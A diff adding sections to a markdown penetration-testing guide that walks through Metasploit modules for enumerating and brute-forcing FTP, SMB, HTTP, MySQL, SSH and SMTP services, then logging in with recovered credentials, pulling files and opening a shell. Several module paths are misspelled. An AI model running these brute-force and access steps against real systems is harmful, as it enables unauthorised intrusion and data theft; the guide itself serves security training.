@@ -775,3 +775,441 @@ use auxiliary/scanner/discovery/udp_sweep  # Use the Auxiliary module
 set RHOSTS new-target-ip  # Set the new ip target for the new scan
 run  # Execute the Auxiliary module
 ```
+
+
+### FTP Enumeration
+
+We'll discover how to gain as much informations as possible regarding FTP.
+
+#### What is FTP?
+
+FTP (File Transfer Protocol) is a protocol that is typically hosted on port 21.
+<br>
+It facilitates file transfer between client(s) and server or directories of web server.
+<br>
+FTP enable authentication with username and password, meaning that it may be vulnerable to brute-force attacks.
+
+#### Auxiliary Module for ftp version
+
+Here's a summary of how to procede in order to use Metasploit framework with an Auxiliary module for ftp version scan:
+
+```bash
+# run postgresql and msfconsole and create a new workspace
+search portscan  # To search for port scan Auxiliary protocols
+use 5  # Use the TCP port scan
+show options  
+set RHOSTS target-ip  # Set the target ip
+run  # Execute the Auxiliary protocol
+search type:auxiliary ftp  # Search for Auxiliary ftp modules
+use auxiliary/scanner/ftp/ftp_version  # Use the ftp scanner that also searches for version  
+show options  # Check the information of your scan. We are performing a ftp scan so we have to ensure that the RPORT is set to 21 (or a ftp port)
+set RHOSTS target-ip  # Set the target ip
+run  # Execute the ftp port version 
+```
+
+After this, in our example, we have found the version of the ftp port of our target.
+<br>
+We can further search for that version in our Auxiliary modules (for exploitation phase).
+
+#### Auxiliary Module for ftp brute-force
+
+Here's a summary of how to procede in order to use Metasploit framework with an Auxiliary module for ftp brute force scan:
+
+```bash
+# run postgresql and msfconsole and create a new workspace
+# search for the first port scan, set the target-ip and run it
+search type:auxiliary ftp  # Search for Auxiliary ftp modules
+use auxiliary/scanner/ftp/ftp_login  # Use the ftp brute force for ftp login  
+show options  
+```
+
+In this case we have to set the RHOST with our target-ip, we also have to check if the RPORT is on 21 (or a ftp port).
+<br>
+Also, we have to set the USERNAME we need to test or the USER_FILE to pass a file with usernames. Then we have to pass a PASS_FILE to pass a file with passwords, too.
+
+```bash
+set RHOST target-ip
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt  # Metasploit has a built-in file with common users
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt  # Metasploit has a built-in file with common passwords
+run  # Perform the brute force attack to try to authenticate on the FTP port
+```
+
+After you have get a valid combination, you can try to log in to ftp with them.
+<br>
+Please note that using brute-force may cause the ftp server to shut-down or block new authentications from the same ip, for some time.
+
+```bash
+# Exit from Metasploit framework console
+ftp target-ip
+# Write username and password
+ls  # After you have successfully logged in you can try to explore the directories and files
+get filename.format  # You may find some interesting file(s): you can download it
+```
+
+#### Auxiliary Module for ftp anonymous login
+
+Here's a summary of how to procede in order to use Metasploit framework with an Auxiliary module for anonymous ftp login:
+
+```bash
+# run postgresql and msfconsole and create a new workspace
+# search for the first port scan, set the target-ip and run it
+search type:auxiliary ftp  # Search for Auxiliary ftp modules
+use auxiliary/scanner/ftp/anonymous  # Use the anonymous ftp login  
+show options  
+set RHOSTS target-ip  # Set the target ip
+run  # Execute the anonymous login
+```
+
+Please note that often this anonymous login doesn't work, but in certain cases it can find ftp servers that doesn't need credentials for login.
+
+
+### SMB Enumeration
+
+SMB (Server Message Block) is a network sharing protocol that allows file sharing between two computers on the same LAN or between some devices (for example a computer and a printer).
+<br>
+SMB uses the port 445 ftp.
+<br>
+On Linux it's called SAMBA.
+<br>
+Here we will perform enumeration on shares, users and passwords in order to try to authenticate on SMB port.
+
+```bash
+# run postgresql and msfconsole and create a new workspace
+# search for the first port scan, set the target-ip and run it
+setg RHOSTS target-ip  # In Metasploit framework you can set a global variable that will use your target-ip as the RHOSTS for every module you use
+search type:auxiliary smb  # Search for Auxiliary smb modules
+use auxiliary/scanner/smb/smb_version  # Auxiliary module to scan the version of the SMB port
+run  # Execute the smb version scan
+```
+
+#### Auxiliary Module for smb user enumeration
+
+```bash
+# run postgresql and msfconsole and create a new workspace
+# search for the first port scan, set the target-ip and run it
+setg RHOSTS target-ip  # In Metasploit framework you can set a global variable that will use your target-ip as the RHOSTS for every module you use
+search type:auxiliary smb  # Search for Auxiliary smb modules
+use auxiliary/scanner/smb/smb_enumusers  # Auxiliary module to enumerate users on that smb
+run  # Execute the smb user enumeration
+```
+
+This may show the users on that smb port. 
+
+#### Auxiliary Module for smb shares enumeration
+
+```bash
+# run postgresql and msfconsole and create a new workspace
+# search for the first port scan, set the target-ip and run it
+setg RHOSTS target-ip  # In Metasploit framework you can set a global variable that will use your target-ip as the RHOSTS for every module you use
+search type:auxiliary smb  # Search for Auxiliary smb modules
+use auxiliary/scanner/smb/smb_enumshares  # Auxiliary module to enumerate shares on that smb
+set ShowFiles true  # Enable a detailed description of what it finds
+run  # Execute the smb shares enumeration
+```
+
+#### Auxiliary Module for smb login 
+
+```bash
+# run postgresql and msfconsole and create a new workspace
+# search for the first port scan, set the target-ip and run it
+setg RHOSTS target-ip  # In Metasploit framework you can set a global variable that will use your target-ip as the RHOSTS for every module you use
+search type:auxiliary smb  # Search for Auxiliary smb modules
+use auxiliary/scanner/smb/smb_login  # Auxiliary module to brute-force login on smb port
+set SMBUser target-user  # Set the user to try to login
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt  # Metasploit has a built-in file with common passwords
+run  # Execute the smb shares enumeration
+```
+
+After you have successfully got a valid username and password you can try to get the shares of that smb user.
+
+```bash
+# exit from Metasploit framework
+smbclient -L \\\\target-ip\\ -U target-user  # List all the shares available by the target user
+# write the password that you got before
+smbclient \\\\target-ip\\share-target -U target-user  # You can access a specific target share
+```
+
+Now you can access the share with its folders and files and so on.
+
+
+### Web Server Enumeration
+
+Web Server is a software that serves website data on the web. It is a software that hosts the directories of your website and grants the access to them.
+<br>
+Common web servers are Apache, Nginx, etc.
+<br>
+They use HTTP (HyperText Transfer Protocol) to facilitate the communication between clients and the web server.
+<br>
+HTTP is a protocol that uses TCP on port 80, while HTTPS works on port 443.
+
+<br>
+<br>
+When you open your browser and search an HTTP or HTTPS website, the browser will perform a DNS lookup to resolve that domain to the web server ip address.
+<br>
+It will send an HTTP request to the web server and it will receive a HTTP response from the web server.
+
+<br>
+<br>
+We can enumerate the web server discovering what version its running, what web server, gain information on http headers, programming languages, or discovering hidden files, etc.
+
+```bash
+# run postgresql and msfconsole and create a new workspace
+# search for the first port scan, set the target-ip and run it
+setg RHOSTS target-ip  # In Metasploit framework you can set a global variable that will use your target-ip as the RHOSTS for every module you use
+search type:auxilary http  # Search for Auxiliary modules about http
+use auxilary/scanner/http/http_version  # Use the Auxiliary module for Http version scan
+# If your target uses HTTPS then you will have to set RPORT to 443 and SSL to true
+run  # Execute the http version scan
+search http_header  # Search for Auxiliary modules for http headers
+use auxilary/scanner/http/http_header  # Use the Auxiliary module for http header scan
+run  # Execute the http header scan, and you can find the programming languages used
+```
+
+#### Auxiliary Modules for robots.txt
+
+```bash
+# run postgresql and msfconsole and create a new workspace
+# search for the first port scan, set the target-ip and run it
+setg RHOSTS target-ip  # In Metasploit framework you can set a global variable that will use your target-ip as the RHOSTS for every module you use
+search robots_txt  # Search for Auxiliary modules about robots.txt
+use auxilary/scanner/http/robots_txt  # Use the Auxiliary module for robots.txt file
+run  # Execute the robots.txt search
+```
+
+In the robots.txt you may find some directories that are excluded by indexing, so you may try to access them and see their content.
+
+```bash
+curl target-ip/target-folder  # Watch the http content of the folder that you found in the robots.txt
+```
+
+You may see that certain target-folder are accessible and you can see the content, while others are protected or require credentials.
+<br>
+In this case you may try a brute-force module to try to access them.
+
+### Auxiliary Modules for brute-force directory scanner
+
+```bash
+# run postgresql and msfconsole and create a new workspace
+# search for the first port scan, set the target-ip and run it
+setg RHOSTS target-ip  # In Metasploit framework you can set a global variable that will use your target-ip as the RHOSTS for every module you use
+search dir_scanner  # Search for Auxiliary modules for brute-force directory scan 
+use auxilary/scanner/http/dir_scanner  # Use the Auxiliary module for brute-force directory scan
+run  # Execute the brute-force for directory scan
+```
+
+With this you may find all the directories of a web server, and you can see if those are free to enter or require authentication.
+
+### Auxiliary Modules for brute-force file scanner
+
+```bash
+# run postgresql and msfconsole and create a new workspace
+# search for the first port scan, set the target-ip and run it
+setg RHOSTS target-ip  # In Metasploit framework you can set a global variable that will use your target-ip as the RHOSTS for every module you use
+search files_dir  # Search for Auxiliary modules for brute-force file scan
+use auxilary/scanner/http/files_dir  # Use the Auxiliary module for brute-force file scan
+run  # Execute the brute-force on file scan
+```
+
+Here you can find all the files that are on the web server. Some are accessible, others require authentication.
+
+### Auxiliary Modules for brute-force login
+
+```bash
+# run postgresql and msfconsole and create a new workspace
+# search for the first port scan, set the target-ip and run it
+setg RHOSTS target-ip  # In Metasploit framework you can set a global variable that will use your target-ip as the RHOSTS for every module you use
+search http_login  # Search for Auxiliary modules for brute-force login
+use auxilary/scanner/http/http_login  # Use the Auxiliary module for brute-force file scan
+set AUTH_URI target-folder  # Set the target-folder that we want to access
+unset USERPASS_FILE  # Unset the userpass file since in the options we already have a USER_FILE and a PASS_FILE
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/namelist.txt  # In certain cases you may need to change the user brute-force list (using a list in the Metasploit framework)
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt  # Same as above
+set VERBOSE false  # Don't show the failed results and show only the successful ones
+run  # Execute the brute-force on login
+```
+
+In case you want to perform a brute-force on a single user you can:
+
+```bash
+echo "target-user" > username.txt  # Save the target user on a file
+set USER_FILE username.txt  # Use your file
+run  # Execute the brute-force on login 
+```
+
+### Auxiliary Modules for Apache Enumeration
+
+You can try to enumerate valid users on the server with this.
+
+```bash
+# run postgresql and msfconsole and create a new workspace
+# search for the first port scan, set the target-ip and run it
+setg RHOSTS target-ip  # In Metasploit framework you can set a global variable that will use your target-ip as the RHOSTS for every module you use
+search apache_userdir_enum  # Search for Auxiliary modules for Apache enumeration
+use auxilary/scanner/http/apache_userdir_enum  # Use the Auxiliary module for Apache enumeration
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt  # Set the list of common users from Metasploit framework list
+run  # Start Apache enumeration
+```
+
+### Mysql Enumeration
+
+Mysql is a open source relational system based on SQL. 
+<br>
+It is often used on web applications data.
+<br>
+Mysql uses tcp port 3306 by default.
+<br>
+With Mysql Enumeration we can execute SQL commands and gain access and informations about tables and data.
+
+```bash
+# run postgresql and msfconsole and create a new workspace
+# search for the first port scan, set the target-ip and run it
+setg RHOSTS target-ip  # In Metasploit framework you can set a global variable that will use your target-ip as the RHOSTS for every module you use
+search type:auxilary mysql  # Search for Auxiliary modules for Mysql version
+use auxilary/scanner/mysql/mysql_version  # Use the Auxiliary module for Mysql version
+run  # Search for Mysql version
+```
+
+After we have found the Mysql version we can either try to search for some Auxiliary modules on that particular version, or we can try to gain access with brute-force.
+
+#### Auxiliary Module for Mysql login 
+
+```bash
+# run postgresql and msfconsole and create a new workspace
+# search for the first port scan, set the target-ip and run it
+setg RHOSTS target-ip  # In Metasploit framework you can set a global variable that will use your target-ip as the RHOSTS for every module you use
+search type:auxilary mysql  # Search for Auxiliary modules for Mysql version
+use auxilary/scanner/mysql/mysql_login  # Use the Auxiliary module for Mysql login with brute-force
+set USERNAME root  # In this case we have to specify the root user because we'll do the brute-force attack on the main user (root)
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt  # Set the password to use from the Metasploit framework
+set VERBOSE false  # Display only successful credentials
+run  # Start the brute-force for credentials
+```
+
+After we have gained credentials we can use the Auxiliary module for Mysql Enumeration
+
+```bash
+search mysql_enum  # Search for the Mysql Enum Auxiliary module
+use auxilary/admin/mysql/mysql_enum  # This module requires root credentials (so we can use what we have found above)
+set USERNAME root  # Set the username (root)
+set PASSWORD target-password  # Set the target-password
+run  # Start Mysql Enumeration
+```
+
+Now we can gain access to more informations.
+
+#### Auxiliary Module for Mysql SQL
+
+With this module we can execute SQL queries into Mysql target.
+
+```bash
+# run postgresql and msfconsole and create a new workspace
+# search for the first port scan, set the target-ip and run it
+setg RHOSTS target-ip  # In Metasploit framework you can set a global variable that will use your target-ip as the RHOSTS for every module you use
+search type:auxilary mysql  # Search for Auxiliary modules for Mysql version
+use auxilary/admin/mysql/mysql_sql  # Use the Auxiliary module for executing SQL queries in our Mysql target port 
+set USERNAME root  # Set the username (root)
+set PASSWORD target-password  # Set the target-password
+set SQL query  # Write the query that you want to execute (example: show databases;)
+run  # Execute the sql query
+```
+
+#### Auxiliary Module for Mysql Schema
+
+This module extracts schema informations of our Mysql target.
+
+```bash
+# run postgresql and msfconsole and create a new workspace
+# search for the first port scan, set the target-ip and run it
+setg RHOSTS target-ip  # In Metasploit framework you can set a global variable that will use your target-ip as the RHOSTS for every module you use
+search type:auxilary mysql  # Search for Auxiliary modules for Mysql
+use auxilary/scanner/mysql/mysql_schemadump  # Use the Auxiliary module to gain schema dump on our Mysql target port 
+set USERNAME root  # Set the username (root)
+set PASSWORD target-password  # Set the target-password
+run  # Execute the sql to access schema
+```
+
+*In Metasploit framework you can access to everything you have extracted using the loot and creds commands.*
+
+#### Execute Sql queries directly on Mysql
+
+```bash
+# exit the msfconsole and workspace
+mysql -h target-ip -u username-target -p  # Log in mysql directly from the shell with your target username
+# Write the password
+```
+
+Now you can execute any sql query.
+
+
+### SSH Enumeration
+
+SSH (Secure Shell) is a remote administration protocol that offers encryption.
+<br>
+It is used for remote access to servers and systems. It allows for users-password credentials or a private key pair.
+<br>
+It uses tcp port 22.
+
+```bash
+# run postgresql and msfconsole and create a new workspace
+# search for the first port scan, set the target-ip and run it
+setg RHOSTS target-ip  # In Metasploit framework you can set a global variable that will use your target-ip as the RHOSTS for every module you use
+search type:auxilary ssh # Search for Auxiliary modules for SSH version
+use auxilary/scanner/ssh/ssh_version  # Use the Auxiliary module to gain schema dump on our Mysql target port 
+run  # Get the ssh version
+```
+
+#### Auxiliary Module for SSH login
+
+```bash
+# run postgresql and msfconsole and create a new workspace
+# search for the first port scan, set the target-ip and run it
+setg RHOSTS target-ip  # In Metasploit framework you can set a global variable that will use your target-ip as the RHOSTS for every module you use
+search type:auxilary ssh  # Search for Auxiliary modules for SSH
+use auxilary/scanner/ssh/ssh_login  # Use the Auxiliary module for ssh login with brute-force
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/namelist.txt  # Set the username to use from the Metasploit framework
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt  # Set the password to use from the Metasploit framework
+set VERBOSE false  # Display only successful credentials
+run  # Start the brute-force for credentials
+```
+
+After it got the credentials you can start a ssh session inside the msfconsole.
+
+```bash
+sessions  # Watch the sessions you have
+sessions session-name  # Use the session with the credentials you have just got
+/bin/bash -i  # Start a bash shell
+```
+
+Now you can execute shell commands on the operating system from this SSH session.
+
+#### Auxiliary Module for SSH user enumeration
+
+```bash
+# run postgresql and msfconsole and create a new workspace
+# search for the first port scan, set the target-ip and run it
+setg RHOSTS target-ip  # In Metasploit framework you can set a global variable that will use your target-ip as the RHOSTS for every module you use
+search type:auxilary ssh  # Search for Auxiliary modules for SSH
+use auxilary/scanner/ssh/ssh_enumusers  # Use the Auxiliary module for ssh users enumeration
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/namelist.txt  # Set the username to use from the Metasploit framework
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt  # Set the password to use from the Metasploit framework
+run  # Perform users enumeration
+```
+
+### SMTP Enumeration
+
+SMTP (Simple Mail Transfer Protocol) is a communication protocol that is used to send emails.
+<br>
+It runs on port 25 on default, but it is often configured on port 465 or 587.
+<br>
+```bash
+# run postgresql and msfconsole and create a new workspace
+# search for the first port scan, set the target-ip and run it
+setg RHOSTS target-ip  # In Metasploit framework you can set a global variable that will use your target-ip as the RHOSTS for every module you use
+search type:auxilary smtp  # Search for Auxiliary modules for SMTP
+use auxilary/scanner/smtp/smtp_version  # Use the Auxiliary module for smtp version
+run  # Get the smtp version
+use auxilary/scanner/smtp/smtp_enum  # Auxiliary module for smtp enumeration
+# Specify a different USER_FILE file if necessary
+run  # Perform users enumeration by brute-force
+```
+
